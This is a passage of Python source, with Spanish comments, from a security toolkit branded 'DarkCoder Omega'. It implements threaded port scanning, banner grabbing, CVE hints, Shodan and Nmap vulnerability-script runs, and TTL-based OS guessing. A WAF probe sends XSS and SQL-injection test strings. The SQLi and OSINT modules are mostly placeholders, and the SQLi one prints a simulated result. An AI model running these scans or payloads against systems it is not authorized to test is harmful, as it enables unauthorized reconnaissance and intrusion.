                logging.debug(f"Error en banner grabbing para {ip}:{puerto} con probe '{probe_name}': {e_banner}")
                continue
        return banner if banner else "No capturado o vacío"

    def _sugerir_cves_por_banner(self, banner):
        sugerencias = []
        if not banner or banner == "No capturado o vacío": return sugerencias
        banner_lower = banner.lower()
        for service_key, cve_list in self.CVE_SUGGESTIONS_DB.items():
            if service_key.lower() in banner_lower:
                sugerencias.extend([f"{cve} (potencialmente relacionado con '{service_key}')" for cve in cve_list])
        
        # Búsqueda por números de versión (ej: "Apache/2.4.53" -> "2.4.53")
        version_match = re.search(r'([\d]+\.[\d]+(?:\.[\d]+)*)', banner)
        if version_match:
            version_str = version_match.group(1)
            # Podría buscar por "product version", pero la DB es simple
            for service_key, cve_list in self.CVE_SUGGESTIONS_DB.items():
                 if version_str in service_key: # Ej: "2.4." en "Apache http server 2.4."
                    sugerencias.extend([f"{cve} (potencialmente por versión '{version_str}' en '{service_key}')" for cve in cve_list])
        return list(set(sugerencias)) # Eliminar duplicados

    def _escanear_puerto_worker(self, ip, puerto, proto="tcp"):
        if self.scan_interrupted: return

        estado = "cerrado/filtrado"
        banner_final = ""
        cves_sugeridas = []
        servicio_estimado = self.PUERTOS_TCP_COMUNES.get(puerto, "desconocido") if proto == "tcp" else self.PUERTOS_UDP_COMUNES.get(puerto, "desconocido")
        
        try:
            # socket.setdefaulttimeout(CONFIG.get("default_timeout", 10) / 2) # Timeout más corto para escaneo
            # No usar setdefaulttimeout aquí. Usar s.settimeout()
            s_type = socket.SOCK_STREAM if proto == "tcp" else socket.SOCK_DGRAM
            s = socket.socket(socket.AF_INET, s_type)
            s.settimeout(max(1, CONFIG.get("default_timeout", 10) / 2.5)) # Timeout para conexión de puerto

            if proto == "tcp":
                if s.connect_ex((ip, puerto)) == 0: # connect_ex devuelve 0 si es exitoso
                    estado = "abierto"
                    banner_final = self._capturar_banner(ip, puerto, proto)
                    cves_sugeridas = self._sugerir_cves_por_banner(banner_final)
                s.close()
            elif proto == "udp":
                # Escaneo UDP es menos fiable. Enviar datos y esperar ICMP Port Unreachable o respuesta.
                # Esto es una simplificación. Un buen escáner UDP requiere más lógica.
                try:
                    s.sendto(b"X", (ip, puerto)) # Enviar un byte
                    s.recvfrom(1024) # Esperar respuesta (si la hay)
                    estado = "abierto UDP (posible)" # Si no hay error, podría estar abierto
                    # Banner grabbing UDP es difícil y específico del servicio
                    banner_final = self._capturar_banner(ip, puerto, proto) # Intentar de todos modos (raro que funcione)
                except socket.timeout:
                    estado = "abierto|filtrado UDP" # Timeout puede ser abierto o filtrado
                except ConnectionRefusedError: # ICMP Port Unreachable (Windows)
                    estado = "cerrado UDP"
                except OSError as e_os_udp: # ICMP Port Unreachable (Linux)
                     if e_os_udp.errno == 111 or e_os_udp.errno == 10061: # Connection refused
                         estado = "cerrado UDP"
                     else: estado = "filtrado UDP (error)"
                finally:
                    s.close()
            
            if "abierto" in estado: # Solo añadir si está abierto o potencialmente abierto
                with self.lock:
                    self.puertos_abiertos.append({
                        "ip": ip, "puerto": puerto, "protocolo": proto, 
                        "estado": estado, "servicio_comun": servicio_estimado, 
                        "banner": banner_final, "cves_potenciales": cves_sugeridas
                    })
                    UI.imprimir_exito(f"Puerto {proto.upper()}/{puerto} ({servicio_estimado}) en {ip} está {estado}. Banner: {banner_final[:50]}...", prefix=f"[{Colores.VERDE}SCAN{Colores.RESET}] ")
        except Exception as e:
            logging.debug(f"Error escaneando {ip}:{puerto}/{proto} - {e}")
            # No añadir a puertos_abiertos si hay error general

    def _consultar_shodan(self, ip_target):
        if not SHODAN_LIB_DISPONIBLE:
            # UI.imprimir_advertencia("Librería 'shodan' no instalada. No se puede consultar Shodan.")
            return {"error": "Librería 'shodan' no instalada."}
        api_key = CONFIG.get("shodan_api_key")
        if not api_key:
            # UI.imprimir_advertencia("Clave API de Shodan no configurada. Omitiendo consulta.")
            return {"error": "Clave API de Shodan no configurada."}
        
        UI.imprimir_mensaje(f"Consultando Shodan para {ip_target}...", Colores.CYAN)
        try:
            api = Shodan(api_key)
            host_info = api.host(ip_target)
            self.shodan_data = {
                "IP": host_info.get("ip_str", "N/A"),
                "Organización": host_info.get("org", "N/A"), "ISP": host_info.get("isp", "N/A"),
                "ASN": host_info.get("asn", "N/A"), "País": host_info.get("country_name", "N/A"),
                "Ciudad": host_info.get("city", "N/A"), "Hostnames": host_info.get("hostnames", []),
                "Dominios": host_info.get("domains", []),
                "Puertos Abiertos (Shodan)": host_info.get("ports", []),
                "Vulnerabilidades (Shodan CVEs)": host_info.get("vulns", []), # Lista de CVEs
                "Tags": host_info.get("tags", []),
                "Servicios": []
            }
            for item in host_info.get("data", []):
                service_info = {
                    "puerto": item.get("port"), "protocolo": item.get("transport", "tcp"),
                    "banner": item.get("data","").strip(), "producto": item.get("product"),
                    "version": item.get("version"), "cpe": item.get("cpe")
                }
                self.shodan_data["Servicios"].append(service_info)
            UI.imprimir_exito("Información de Shodan obtenida.")
            return self.shodan_data
        except Exception as e_shodan:
            UI.imprimir_error(f"Error al consultar Shodan: {e_shodan}")
            return {"error": str(e_shodan)}

    def _parsear_xml_nmap(self, ruta_xml_nmap):
        if not os.path.exists(ruta_xml_nmap):
            UI.imprimir_error(f"Archivo XML de Nmap no encontrado: {ruta_xml_nmap}"); return None
        
        UI.imprimir_mensaje(f"Parseando archivo XML de Nmap: {ruta_xml_nmap}...", Colores.CYAN)
        nmap_data = {"hosts": []}
        try:
            import xml.etree.ElementTree as ET
            tree = ET.parse(ruta_xml_nmap)
            root = tree.getroot()

            for host_el in root.findall("host"):
                ip_addr_el = host_el.find("address[@addrtype='ipv4']")
                ip_addr = ip_addr_el.get("addr") if ip_addr_el is not None else "N/A"
                
                host_info = {"ip": ip_addr, "status": host_el.find("status").get("state"), "ports": [], "os_matches": [], "scripts": []}

                # OS Detection
                os_el = host_el.find("os")
                if os_el is not None:
                    for osclass_el in os_el.findall("osclass"): # Más detallado
                        os_match = {
                            "type": osclass_el.get("type"), "vendor": osclass_el.get("vendor"),
                            "osfamily": osclass_el.get("osfamily"), "osgen": osclass_el.get("osgen"),
                            "accuracy": osclass_el.get("accuracy"), "cpe": [c.text for c in osclass_el.findall("cpe")]
                        }
                        host_info["os_matches"].append(os_match)
                    for osmatch_el in os_el.findall("osmatch"): # Resumen
                         if not host_info["os_matches"]: # Si no hay osclass, usar osmatch
                            host_info["os_matches"].append({"name": osmatch_el.get("name"), "accuracy": osmatch_el.get("accuracy")})


                # Puertos y Servicios
                ports_el = host_el.find("ports")
                if ports_el is not None:
                    for port_el in ports_el.findall("port"):
                        port_id = port_el.get("portid")
                        protocol = port_el.get("protocol")
                        state_el = port_el.find("state")
                        state = state_el.get("state") if state_el is not None else "N/A"
                        
                        port_data = {"portid": port_id, "protocol": protocol, "state": state, "service": {}, "scripts": []}
                        
                        service_el = port_el.find("service")
                        if service_el is not None:
                            port_data["service"] = {
                                "name": service_el.get("name"), "product": service_el.get("product"),
                                "version": service_el.get("version"), "extrainfo": service_el.get("extrainfo"),
                                "ostype": service_el.get("ostype"), "method": service_el.get("method"),
                                "conf": service_el.get("conf"), "cpe": [c.text for c in service_el.findall("cpe")]
                            }
                        
                        # Scripts por puerto
                        for script_el in port_el.findall("script"):
                            port_data["scripts"].append({"id": script_el.get("id"), "output": script_el.get("output")})
                            # Añadir a la lista global de scripts del host también
                            host_info["scripts"].append({"port": port_id, "id": script_el.get("id"), "output": script_el.get("output")})
                        host_info["ports"].append(port_data)
                
                # Scripts a nivel de host
                hostscript_el = host_el.find("hostscript")
                if hostscript_el:
                    for script_el in hostscript_el.findall("script"):
                         host_info["scripts"].append({"port": "host", "id": script_el.get("id"), "output": script_el.get("output")})
                
                nmap_data["hosts"].append(host_info)
            
            UI.imprimir_exito("Parseo de Nmap XML completado.")
            return nmap_data
        except ImportError: UI.imprimir_error("Se necesita xml.etree.ElementTree para parsear XML de Nmap.")
        except ET.ParseError: UI.imprimir_error(f"Error parseando el archivo XML de Nmap: {ruta_xml_nmap}")
        except Exception as e: UI.imprimir_error(f"Error procesando XML de Nmap: {e}")
        return None

    def _estimar_os_por_ttl(self, ip_target):
        # Muy básico, depende de que ping esté en PATH
        # Esto es menos fiable que Nmap, pero es un intento rápido
        try:
            param = '-n' if os.name == 'nt' else '-c'
            command = ['ping', param, '1', ip_target]
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            stdout, stderr = process.communicate(timeout=5)

            if process.returncode == 0:
                ttl_match = re.search(r"ttl=(\d+)", stdout, re.I)
                if ttl_match:
                    ttl = int(ttl_match.group(1))
                    self.os_info["ping_ttl"] = ttl
                    # Valores TTL comunes (aproximados, pueden variar)
                    if 60 <= ttl <= 64: self.os_info["guess"] = "Linux/Unix (TTL ~64)"; self.os_info["accuracy"]=30
                    elif 120 <= ttl <= 128: self.os_info["guess"] = "Windows (TTL ~128)"; self.os_info["accuracy"]=30
                    elif 250 <= ttl <= 255: self.os_info["guess"] = "Solaris/Cisco (TTL ~255)"; self.os_info["accuracy"]=25
                    else: self.os_info["guess"] = f"Desconocido (TTL={ttl})"; self.os_info["accuracy"]=10
                    UI.imprimir_mensaje(f"OS estimado por TTL ({ttl}): {self.os_info['guess']}", Colores.CYAN)
                    return
        except subprocess.TimeoutExpired: UI.imprimir_advertencia("Ping para TTL timed out.")
        except FileNotFoundError: UI.imprimir_advertencia("Comando 'ping' no encontrado. No se puede estimar OS por TTL.")
        except Exception as e_ttl: UI.imprimir_advertencia(f"Error al estimar OS por TTL: {e_ttl}")
        self.os_info["guess"] = "No se pudo estimar por TTL"


    def _detectar_waf_basico(self, url_base):
        # Prueba con un payload común que suele ser bloqueado por WAFs
        test_payloads = ["?sql=<script>alert(1)</script>", "?xss=' OR 1=1 --"]
        self.waf_detectado = "No detectado (prueba básica)"
        
        for payload in test_payloads:
            if self.scan_interrupted: return
            test_url = urljoin(url_base, payload)
            try:
                # Usar make_request_util para consistencia
                response = make_request_util(test_url, method="GET")
                if response is None: continue # Falló la petición

                # Comprobar status code y contenido
                # WAFs suelen devolver 403, 406, 503, o a veces 200 con una página de bloqueo.
                content = response.text.lower()
                headers = {k.lower(): v for k,v in response.headers.items()}

                for pattern in self.WAF_PATTERNS:
                    if pattern.search(content) or \
                       any(pattern.search(h_val) for h_val in headers.values()) or \
                       (response.status_code in [403, 406, 429, 503] and pattern.search(response.reason.lower())): # Check reason text
                        self.waf_detectado = f"Posible WAF detectado (patrón: {pattern.pattern}, status: {response.status_code})"
                        UI.imprimir_advertencia(self.waf_detectado)
                        return
            except Exception as e_waf:
                logging.debug(f"Error en prueba WAF para {test_url}: {e_waf}")
        UI.imprimir_mensaje("Prueba básica de WAF no arrojó resultados concluyentes.", Colores.GRIS)


    def _lanzar_nmap_y_parsear(self, ip_target, nmap_args_str):
        nmap_executable = CONFIG.get("nmap_executable_path", "nmap")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Sanitize IP for filename
        ip_filename_safe = ip_target.replace(".", "_").replace(":", "_")
        xml_output_file = os.path.join(CONFIG.get("report_subdir", "DarkCoder_Omega_Reports"), f"nmap_scan_{ip_filename_safe}_{timestamp}.xml")
        
        # Asegurarse que el directorio de reportes exista para el XML de Nmap
        os.makedirs(CONFIG.get("report_subdir", "DarkCoder_Omega_Reports"), exist_ok=True)

        # Comando base de Nmap con salida XML
        # nmap_args_str debe ser lo que el usuario quiera, ej: -sV -sC -O -p-
        command = [nmap_executable] + nmap_args_str.split() + ["-oX", xml_output_file, ip_target]

        UI.imprimir_mensaje(f"Lanzando Nmap: {' '.join(command)}", Colores.CYAN)
        UI.imprimir_mensaje("Esto puede tardar bastante dependiendo de los argumentos...", Colores.AMARILLO)
        
        parsed_nmap_data = None
        try:
            # Usar Popen para poder mostrar que Nmap está corriendo
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            
            # Mostrar un spinner o mensaje mientras Nmap corre
            spinner = itertools.cycle(['-', '\\', '|', '/'])
            while process.poll() is None: # Mientras el proceso esté corriendo
                if self.scan_interrupted:
                    process.terminate() # Intentar terminar Nmap si se interrumpe
                    try: process.wait(timeout=5)
                    except subprocess.TimeoutExpired: process.kill()
                    UI.imprimir_advertencia("Escaneo Nmap interrumpido.")
                    return None
                sys.stdout.write(f"\r{Colores.GRIS}Nmap en ejecución... {next(spinner)}{Colores.RESET}")
                sys.stdout.flush()
                time.sleep(0.1)
            sys.stdout.write("\rNmap finalizado.                            \n") # Limpiar línea
            
            stdout, stderr = process.communicate() # Obtener salida restante

            if process.returncode != 0:
                UI.imprimir_error(f"Nmap falló (código {process.returncode}):")
                if stdout: UI.imprimir_mensaje(f"Nmap stdout: {stdout}", Colores.GRIS)
                if stderr: UI.imprimir_error(f"Nmap stderr: {stderr}")
                return None
            
            if os.path.exists(xml_output_file):
                UI.imprimir_exito(f"Salida XML de Nmap guardada en: {xml_output_file}")
                parsed_nmap_data = self._parsear_xml_nmap(xml_output_file)
                if parsed_nmap_data and parsed_nmap_data.get("hosts"):
                    # Actualizar OS info si Nmap lo encontró con mejor precisión
                    for host_data in parsed_nmap_data["hosts"]:
                        if host_data["ip"] == ip_target and host_data["os_matches"]:
                            best_os_match = max(host_data["os_matches"], key=lambda x: int(x.get("accuracy",0)), default=None)
                            if best_os_match and int(best_os_match.get("accuracy",0)) > self.os_info.get("accuracy",0):
                                self.os_info["guess"] = best_os_match.get("name", best_os_match.get("osfamily", "N/A")) + f" (Nmap, Acc: {best_os_match.get('accuracy')}%)"
                                self.os_info["accuracy"] = int(best_os_match.get("accuracy",0))
                                self.os_info["nmap_details"] = best_os_match
                    UI.imprimir_mensaje(f"OS actualizado por Nmap: {self.os_info['guess']}", Colores.CYAN)
            else:
                UI.imprimir_error(f"Archivo XML de Nmap no fue creado: {xml_output_file}")

        except FileNotFoundError:
            UI.imprimir_error(f"Comando Nmap ('{nmap_executable}') no encontrado. Asegúrate que Nmap esté instalado y en el PATH o configura 'nmap_executable_path' en DarkCoder.")
        except Exception as e_nmap_run:
            UI.imprimir_error(f"Error ejecutando Nmap o parseando su salida: {e_nmap_run}")
        return parsed_nmap_data


    def escanear(self):
        self.scan_interrupted = False
        host_o_ip_target = UI.obtener_entrada("[+] IP o Dominio a escanear: ", requerido=True)
        if not host_o_ip_target: return
        ip_target = self._obtener_ip_objetivo(host_o_ip_target)
        if not ip_target: return

        # Resetear para nuevo escaneo
        self.puertos_abiertos = []
        self.os_info = {"guess": "Desconocido", "nmap_details": None, "ping_ttl": None, "accuracy": 0}
        self.waf_detectado = None; self.shodan_data = None; self.threads_scan = []
        self.reporte_scan = {
            "objetivo_original": host_o_ip_target, "ip_escaneada": ip_target, 
            "timestamp_inicio": datetime.now().isoformat(),
            "puertos_tcp": [], "puertos_udp": [], "os_estimado": {},
            "waf_detectado": "No verificado", "shodan_info": "No consultado",
            "nmap_info_procesada": "No ejecutado o sin datos"
        }
        logging.info(f"Iniciando escaneo para {ip_target} (desde {host_o_ip_target})")

        # Opciones de escaneo
        tipo_escaneo_puertos = UI.obtener_entrada(
            "[+] Tipo de escaneo de puertos ([C]omunes, [R]ango, [E]specíficos, [N]inguno): ", 
            default="C", opciones_validas=["C", "R", "E", "N", "c", "r", "e", "n"]
        ).upper()

        puertos_a_escanear_tcp, puertos_a_escanear_udp = [], []

        if tipo_escaneo_puertos == "C":
            puertos_a_escanear_tcp = list(self.PUERTOS_TCP_COMUNES.keys())
            puertos_a_escanear_udp = list(self.PUERTOS_UDP_COMUNES.keys())
        elif tipo_escaneo_puertos == "R":
            r_inicio_tcp = UI.obtener_entrada("[TCP] Puerto inicial del rango: ", tipo=int, default=1, opciones_validas=range(1,65535))
            r_fin_tcp = UI.obtener_entrada("[TCP] Puerto final del rango: ", tipo=int, default=1024, opciones_validas=range(r_inicio_tcp, 65536))
            puertos_a_escanear_tcp = list(range(r_inicio_tcp, r_fin_tcp + 1))
            if UI.obtener_entrada("[+] ¿Escanear rango UDP también? (s/n)", default="n", tipo=bool):
                r_inicio_udp = UI.obtener_entrada("[UDP] Puerto inicial del rango: ", tipo=int, default=1, opciones_validas=range(1,65535))
                r_fin_udp = UI.obtener_entrada("[UDP] Puerto final del rango: ", tipo=int, default=1024, opciones_validas=range(r_inicio_udp, 65536))
                puertos_a_escanear_udp = list(range(r_inicio_udp, r_fin_udp + 1))
        elif tipo_escaneo_puertos == "E":
            puertos_str_tcp = UI.obtener_entrada("[TCP] Puertos específicos (coma sep, ej: 80,443,8080): ", default="80,443")
            puertos_a_escanear_tcp = [int(p.strip()) for p in puertos_str_tcp.split(',') if p.strip().isdigit()]
            if UI.obtener_entrada("[+] ¿Escanear puertos UDP específicos también? (s/n)", default="n", tipo=bool):
                puertos_str_udp = UI.obtener_entrada("[UDP] Puertos específicos (coma sep, ej: 53,161): ", default="53,161")
                puertos_a_escanear_udp = [int(p.strip()) for p in puertos_str_udp.split(',') if p.strip().isdigit()]
        
        # Módulos adicionales
        realizar_shodan = UI.obtener_entrada("[+] ¿Consultar Shodan para esta IP? (s/n, req. API Key): ", default="s", tipo=bool)
        ejecutar_nmap = UI.obtener_entrada("[+] ¿Ejecutar Nmap y parsear su salida? (s/n, req. Nmap instalado): ", default="s", tipo=bool)
        nmap_args = "-sV -sC -O --script=default,vuln" # Argumentos por defecto para Nmap
        if ejecutar_nmap:
            nmap_args = UI.obtener_entrada(f"[+] Argumentos para Nmap (ej: -sV -T4 -p- -A): ", default=nmap_args)
        
        parsear_nmap_existente = False
        if not ejecutar_nmap: # Solo ofrecer parsear existente si no se va a ejecutar uno nuevo
            parsear_nmap_existente = UI.obtener_entrada("[+] ¿Parsear archivo XML de Nmap existente? (s/n): ", default="n", tipo=bool)
        
        estimar_os_ttl = False
        if not ejecutar_nmap: # Estimación TTL solo si Nmap (que es mejor para OS) no se usa
            estimar_os_ttl = UI.obtener_entrada("[+] ¿Intentar estimación básica de OS (ping TTL)? (s/n): ", default="s", tipo=bool)
        
        detectar_waf = UI.obtener_entrada("[+] ¿Intentar detección básica de WAF (si puerto 80/443 está abierto/escaneado)? (s/n): ", default="s", tipo=bool)

        # Ejecutar Nmap primero si se seleccionó, ya que puede encontrar más puertos
        if ejecutar_nmap:
            nmap_scan_results = self._lanzar_nmap_y_parsear(ip_target, nmap_args)
            if nmap_scan_results:
                self.reporte_scan["nmap_info_procesada"] = nmap_scan_results
                # Añadir puertos de Nmap a la lista de escaneo si no están ya
                # y si el usuario no eligió "Ninguno" para el escaneo de puertos de DarkCoder
                if tipo_escaneo_puertos != "N":
                    for host_data in nmap_scan_results.get("hosts", []):
                        if host_data["ip"] == ip_target:
                            for port_data in host_data.get("ports", []):
                                if port_data.get("state") == "open":
                                    port_id = int(port_data.get("portid"))
                                    protocol = port_data.get("protocol")
                                    if protocol == "tcp" and port_id not in puertos_a_escanear_tcp:
                                        puertos_a_escanear_tcp.append(port_id)
                                    elif protocol == "udp" and port_id not in puertos_a_escanear_udp:
                                        puertos_a_escanear_udp.append(port_id)
                    if puertos_a_escanear_tcp: puertos_a_escanear_tcp.sort()
                    if puertos_a_escanear_udp: puertos_a_escanear_udp.sort()
        elif parsear_nmap_existente: # Parsear XML existente
            ruta_xml_nmap_existente = UI.obtener_entrada("[+] Ruta al archivo XML de Nmap a parsear: ", requerido=True)
            if ruta_xml_nmap_existente:
                self.reporte_scan["nmap_info_procesada"] = self._parsear_xml_nmap(ruta_xml_nmap_existente)

        if estimar_os_ttl: self._estimar_os_por_ttl(ip_target)
        
        # Lanzar hilos para escaneo de puertos (TCP y UDP)
        num_hilos_scan = CONFIG.get("max_threads_scan", 50)
        if puertos_a_escanear_tcp or puertos_a_escanear_udp:
            UI.imprimir_mensaje(f"Escaneando {len(puertos_a_escanear_tcp)} puertos TCP y {len(puertos_a_escanear_udp)} puertos UDP con {num_hilos_scan} hilos...", Colores.CYAN)
            
            if puertos_a_escanear_tcp:
                 UI.imprimir_mensaje(f"Puertos TCP a escanear: {', '.join(map(str, puertos_a_escanear_tcp[:15]))}{'...' if len(puertos_a_escanear_tcp)>15 else ''}", Colores.GRIS)
            if puertos_a_escanear_udp:
                 UI.imprimir_mensaje(f"Puertos UDP a escanear: {', '.join(map(str, puertos_a_escanear_udp[:15]))}{'...' if len(puertos_a_escanear_udp)>15 else ''}", Colores.GRIS)

            # Crear lista de tareas (ip, puerto, proto)
            tareas_scan = []
            for puerto_tcp in puertos_a_escanear_tcp: tareas_scan.append((ip_target, puerto_tcp, "tcp"))
            for puerto_udp in puertos_a_escanear_udp: tareas_scan.append((ip_target, puerto_udp, "udp"))
            
            # Barra de progreso si TQDM está disponible
            pbar_scan = None
            if TQDM_DISPONIBLE and tareas_scan:
                pbar_scan = tqdm(total=len(tareas_scan), unit=" puerto", desc=f"{Colores.CYAN}Escaneando Puertos{Colores.RESET}", ncols=100)

            # Dividir tareas entre hilos (de forma simple)
            # Una forma más eficiente sería usar una cola (queue.Queue)
            for i in range(0, len(tareas_scan), num_hilos_scan):
                if self.scan_interrupted: break
                chunk_tareas = tareas_scan[i:i+num_hilos_scan]
                hilos_chunk = []
                for tarea_ip, tarea_puerto, tarea_proto in chunk_tareas:
                    if self.scan_interrupted: break
                    t = threading.Thread(target=self._escanear_puerto_worker, args=(tarea_ip, tarea_puerto, tarea_proto), name=f"ScanPort-{tarea_puerto}")
                    self.threads_scan.append(t)
                    hilos_chunk.append(t)
                    t.start()
                
                for t_join in hilos_chunk: # Esperar que el chunk actual termine antes de iniciar el siguiente
                    if self.scan_interrupted: break
                    t_join.join(timeout=CONFIG.get("default_timeout", 10) * 1.5) # Timeout por hilo
                    if pbar_scan: pbar_scan.update(1)
                if self.scan_interrupted: break # Salir del bucle de chunks

            if pbar_scan: pbar_scan.close()

        # Esperar hilos restantes (por si alguno quedó colgado o por interrupción)
        for t_resto in self.threads_scan:
             if t_resto.is_alive(): t_resto.join(timeout=1.0)
        self.threads_scan.clear()


        # Si no se interrumpió, proceder con Shodan y WAF
        if not self.scan_interrupted:
            if realizar_shodan:
                self.reporte_scan["shodan_info"] = self._consultar_shodan(ip_target)

            if detectar_waf:
                # Detectar WAF si puerto 80 o 443 está abierto o se va a escanear y se sabe que es HTTP/S
                # Para simplificar, si se pidió WAF y hay puertos TCP, probar en el primero que parezca HTTP.
                # O si Nmap lo detectó.
                url_para_waf = None
                if 80 in puertos_a_escanear_tcp or any(p['puerto'] == 80 and p['protocolo'] == 'tcp' and 'abierto' in p['estado'] for p in self.puertos_abiertos):
                    url_para_waf = f"http://{host_o_ip_target}"
                elif 443 in puertos_a_escanear_tcp or any(p['puerto'] == 443 and p['protocolo'] == 'tcp' and 'abierto' in p['estado'] for p in self.puertos_abiertos):
                    url_para_waf = f"https://{host_o_ip_target}"
                
                # Si Nmap encontró un servicio HTTP/S en otro puerto:
                if not url_para_waf and isinstance(self.reporte_scan["nmap_info_procesada"], dict):
                    for h_data in self.reporte_scan["nmap_info_procesada"].get("hosts", []):
                        if h_data["ip"] == ip_target:
                            for p_data in h_data.get("ports", []):
                                service_name = p_data.get("service", {}).get("name", "").lower()
                                if p_data.get("state") == "open" and ("http" in service_name or "ssl/http" in service_name or service_name == "https"):
                                    proto_waf = "https" if "ssl" in service_name or "https" in service_name or p_data.get("portid") == "443" else "http"
                                    url_para_waf = f"{proto_waf}://{host_o_ip_target}:{p_data.get('portid')}"
                                    break
                            if url_para_waf: break
                
                if url_para_waf:
                    self._detectar_waf_basico(url_para_waf)
                else:
                    UI.imprimir_mensaje("No se encontró un puerto HTTP/S obvio para probar WAF.", Colores.GRIS)

        # Consolidar reporte
        self.reporte_scan["puertos_descubiertos"] = sorted(self.puertos_abiertos, key=lambda x: (x['protocolo'], x['puerto']))
        self.reporte_scan["os_estimado"] = self.os_info
        self.reporte_scan["waf_detectado"] = self.waf_detectado if self.waf_detectado else "No verificado o no detectado"
        self.reporte_scan["timestamp_fin"] = datetime.now().isoformat()

        UI.imprimir_mensaje("\nEscaneo SingularityScan Finalizado.", Colores.AZUL + Colores.NEGRITA)
        UI.imprimir_mensaje(f"Objetivo: {host_o_ip_target} ({ip_target})", Colores.CYAN)
        UI.imprimir_mensaje(f"Puertos Abiertos/Potenciales Encontrados: {len(self.puertos_abiertos)}", Colores.CYAN)
        UI.imprimir_mensaje(f"OS Estimado: {self.os_info.get('guess', 'N/A')}", Colores.CYAN)
        UI.imprimir_mensaje(f"WAF: {self.reporte_scan['waf_detectado']}", Colores.CYAN)

        if UI.obtener_entrada("[+] ¿Guardar reporte detallado del escaneo SingularityScan? (s/n): ", default="s", tipo=bool):
            nombre_base_reporte = f"SingularityScan_{ip_target.replace('.', '_')}"
            for fmt in ["txt", "json", "html", "csv"]:
                UI.guardar_reporte(nombre_base_reporte, self.reporte_scan, formato=fmt)
        self.scan_interrupted = False # Reset for next scan

# ===== [ ESCÁNER SQLi "ORACLEMATRIX X" ] =====
# (Se mantiene la estructura de v7 conceptual, pero con implementaciones más concretas)
class EscanerSQLi:
    ART_ASCII = f"""{Colores.MAGENTA}
   ▄████▄   ██████╗  ▄████▄   ▄▄▄    ▄████████    █████╗ ████████╗██████╗ ██╗  ██╗
  ▒██▀ ▀█  ██╔══██╗▒██▀ ▀█  ▒████▄  ███    ███   ██╔══██╗╚══██╔══╝██╔══██╗██║  ██║
  ▒▓█    ▄ ██████╔╝▒▓█    ▄ ▒██  ▀█▄ ███    █▀    ███████║   ██║   ██████╔╝███████║
  ▒▓▓▄ ▄██▒██╔══██╗▒▓▓▄ ▄██▒░██▄▄▄▄██ ███         ██╔══██║   ██║   ██╔══██╗██╔══██║
  ▒ ▓███▀ ░██║  ██║▒ ▓███▀ ░ ▓█   ▓██▒███    █▄  ██║  ██║   ██║   ██║  ██║██║  ██║
  ░ ░▒ ▒  ░╚═╝  ╚═╝░ ░▒ ▒  ░ ▒▒   ▓▒█░ ██████████ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
{Colores.BLANCO}                              Escáner SQLi "OracleMatrix X"{Colores.MAGENTA}
    {Colores.RESET}"""
    # ... (Implementación completa de EscanerSQLi - MUY EXTENSA, similar a la estructura previa pero con las funciones llenas)
    # Esta clase sería muy grande. Implica:
    # - PAYLOADS_ERROR_SQLI, PAYLOADS_BOOLEAN_SQLI, PAYLOADS_TIME_SQLI, PAYLOADS_UNION_SQLI (para MySQL, MSSQL, PostgreSQL, Oracle)
    # - WAF_BYPASS_PAYLOADS (comentarios, codificaciones, etc.)
    # - Funciones para _testear_parametro, _detectar_dbms, _contar_columnas_union, _extraer_datos_union, _extraer_tablas_columnas
    # - Manejo de GET/POST/JSON/XML payloads
    # - Detección por comparación de contenido, tiempo de respuesta, errores.
    def __init__(self): 
        UI.imprimir_mensaje(self.ART_ASCII, Colores.MAGENTA, prefix="")
        logging.info("EscanerSQLi (OracleMatrix X) inicializado - Funcionalidad Principal Pendiente de Desarrollo Completo.")
        UI.imprimir_advertencia("OracleMatrix X: Módulo en desarrollo avanzado. Funcionalidad actual limitada a placeholder.")

    def escanear_objetivo(self):
        UI.imprimir_advertencia("Funcionalidad de Escaneo SQLi (OracleMatrix X) está en desarrollo y no implementada completamente en esta versión OmegaPoint.")
        UI.imprimir_mensaje("Se requeriría una base de datos extensa de payloads, técnicas de bypass y lógica de inferencia.", Colores.GRIS)
        # Placeholder inputs
        url_objetivo_sqli = UI.obtener_entrada("[+] URL objetivo con parámetros (ej: http://test.com/vuln.php?id=1): ")
        if not url_objetivo_sqli: return
        UI.imprimir_mensaje(f"Objetivo: {url_objetivo_sqli}", Colores.CYAN)
        if UI.obtener_entrada("[+] ¿Simular detección de SQLi simple? (s/n): ", tipo=bool, default='s'):
            time.sleep(0.5)
            UI.imprimir_exito("SQLi (Simulado): Parámetro 'id' parece vulnerable a inyección SQL basada en errores (MySQL)!")
            self.reporte_final_sqli = {
                "url_objetivo": url_objetivo_sqli,
                "vulnerabilidades_simuladas": [{
                    "parametro": "id", "tipo": "Error-based (MySQL)", 
                    "payload_ejemplo": "' OR '1'='1", "dbms_detectado": "MySQL (simulado)"
                }]
            }
            if UI.obtener_entrada("[+] ¿Guardar reporte simulado? (s/n)", tipo=bool, default='s'):
                UI.guardar_reporte(f"OracleMatrixX_Simulado_{urlparse(url_objetivo_sqli).netloc}", self.reporte_final_sqli, "txt")

# ===== [ OSINT WEB "DEEPDIVE SENTINEL" ] =====
class OSINTWeb:
    ART_ASCII = f"""{Colores.NARANJA}
    ▄████████    ▄████████    ▄████████    ████ διαδικτυακή    ▄████████    ███      
   ███    ███   ███    ███   ███    ███   ███     разведка   ███    ███   ███      
   ███    █▀    ███    █▀    ███    █▀    ███                ███    █▀    ███      
   ███         ▄███▄▄▄     ▄███▄▄▄       ███                ███         ███      
 ▀███████████ ▀▀███▀▀▀    ▀▀███▀▀▀        ███              ▀███████████ ███      
   ███    ███   ███    █▄    ███    █▄    ███     розвідка   ███    ███ ███      
   ███    ███   ███    ███   ███    ███   ███    웹 인텔리전스 ███    ███ ███      
   ███    ███   ██████████   ██████████    ██████████████    ███    ███ ████████▄ 
{Colores.BLANCO}                                  OSINT Web "DeepDive Sentinel"{Colores.RESET}"""
    # ... (Implementación completa de OSINTWeb - MUY EXTENSA)
    # Implica: WHOIS, DNS (A, MX, TXT, NS), SSL Cert, Headers, Tecnologías (Wappalyzer-like),
    # Robots.txt, Sitemap, Security.txt, Wayback Machine, Google Dorks,
    # Crawler (con extracción de emails, comentarios, links a redes sociales, metadatos de archivos),
    # Análisis de JS (endpoints, claves API), Detección Cloud, VirusTotal (si API Key).
    def __init__(self): 
        UI.imprimir_mensaje(self.ART_ASCII, Colores.NARANJA, prefix="")
